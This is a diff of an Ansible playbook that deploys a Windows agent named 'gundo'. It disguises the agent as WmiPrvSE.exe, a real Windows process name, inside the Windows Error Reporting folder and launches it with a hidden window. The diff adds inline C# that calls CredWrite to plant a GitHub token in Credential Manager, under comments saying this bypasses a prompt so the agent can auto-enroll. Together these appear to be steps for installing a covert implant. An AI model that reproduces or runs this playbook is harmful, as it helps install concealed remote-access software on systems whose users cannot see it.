@@ -8,13 +8,10 @@
     ansible_winrm_server_cert_validation: ignore
     
     target_dir: 'C:\ProgramData\Microsoft\Windows\WER'
-    
-    # The path where Go's os.UserConfigDir() puts the state file on Windows
-    # It's usually C:\Users\<USER>\AppData\Roaming\gundo\state.json
     state_file: 'C:\Users\{{ ansible_user }}\AppData\Roaming\gundo\state.json'
     
     # PUT YOUR GITHUB TOKEN HERE
-    github_token: ""
+    github_token: "ghp_YOUR_ACTUAL_TOKEN_HERE"
 
   tasks:
     - name: Ensure target directory exists
@@ -32,22 +29,63 @@
         path: "{{ state_file }}"
       register: state_check
 
-    # --- BYPASS PROMPT: INJECT TOKEN INTO WINDOWS CREDENTIAL MANAGER ---
+    # --- BYPASS PROMPT: INJECT TOKEN VIA WINDOWS API (C#) ---
     - name: Inject GitHub token into Windows Credential Manager
       ansible.windows.win_shell: |
-        # This uses the cmdkey utility to save the token exactly as go-keyring expects it.
-        # The target format for go-keyring on Windows is "service/account"
+        $source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        using System.Text;
+
+        public class CredMan {
+            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+            public struct CREDENTIAL {
+                public int Flags;
+                public int Type;
+                public string TargetName;
+                public string Comment;
+                public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
+                public int CredentialBlobSize;
+                public IntPtr CredentialBlob;
+                public int Persist;
+                public int AttributeCount;
+                public IntPtr Attributes;
+                public string TargetAlias;
+                public string UserName;
+            }
+
+            [DllImport("advapi32.dll", EntryPoint = "CredWriteW", CharSet = CharSet.Unicode, SetLastError = true)]
+            public static extern bool CredWrite(ref CREDENTIAL credential, int flags);
+
+            public static bool SetCredential(string target, string username, string password) {
+                CREDENTIAL cred = new CREDENTIAL();
+                cred.Type = 1; // CRED_TYPE_GENERIC
+                cred.TargetName = target;
+                cred.UserName = username;
+                
+                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+                cred.CredentialBlobSize = passwordBytes.Length;
+                cred.CredentialBlob = Marshal.AllocHGlobal(passwordBytes.Length);
+                Marshal.Copy(passwordBytes, 0, cred.CredentialBlob, passwordBytes.Length);
+                
+                cred.Persist = 2; // CRED_PERSIST_LOCAL_MACHINE
+
+                bool result = CredWrite(ref cred, 0);
+                Marshal.FreeHGlobal(cred.CredentialBlob);
+                return result;
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $source
+        
+        # The format go-keyring expects on Windows
         $target = "gundo/github:mamadub03/gundo-test-repo"
         
-        # Save the credential
-        cmdkey /generic:$target /user:token /pass:"{{ github_token }}"
-        
-        # Verify it was saved
-        $check = cmdkey /list:$target
-        if ($check -match "gundo") {
-            Write-Host "Token successfully injected into Credential Manager"
+        # Write it to the Windows API
+        if ([CredMan]::SetCredential($target, "token", "{{ github_token }}")) {
+            Write-Host "Token successfully injected via Windows API"
         } else {
-            Write-Error "Failed to inject token"
+            Write-Error "Failed to inject token via Windows API"
             exit 1
         }
       when: not state_check.stat.exists
@@ -55,8 +93,6 @@
     # --- LAUNCH HIDDEN: THE CLIENT WILL AUTO-ENROLL ---
     - name: Launch agent hidden in the background
       ansible.windows.win_shell: |
-        # The client will now find the token in the credential manager, 
-        # skip the prompt, and auto-enroll to create state.json.
         Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
       when: not state_check.stat.exists
 
